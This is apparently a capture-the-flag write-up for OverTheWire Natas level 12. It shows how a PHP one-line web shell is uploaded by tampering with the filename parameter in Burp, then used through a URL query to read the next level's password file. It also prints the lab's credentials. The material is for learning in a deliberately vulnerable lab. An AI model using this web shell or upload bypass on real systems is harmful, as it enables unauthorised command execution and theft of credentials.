```
Username: natas12
Password: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
URL:      http://natas12.natas.labs.overthewire.org
```

- in this level we can upload .jpeg files to the server
- the size of the file is limited to 1KB 
- no matter what kind of file i try to upload, the source code saves it as a .jpeg file
- this is because it is using the filename POST parameter, not the actual uploaded file's name
- i can try to upload a .php file to exploit a command injection vulnerability
- it saves it as a .jpg file, but i can intercept the POST request with Burp and modify it to save the file as a .php file
- the content of the file is the following:
	- `<?=`$_GET[1]`?>`
- this will let me run commands on the server from the browser, with the URL
- if i upload this and go to the specified path, i can modify the url:
	- `http://natas12.natas.labs.overthewire.org/upload/5wat9omcpu.php?1=cat%20/etc/natas_webpass/natas13`

# Password

- **trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC**
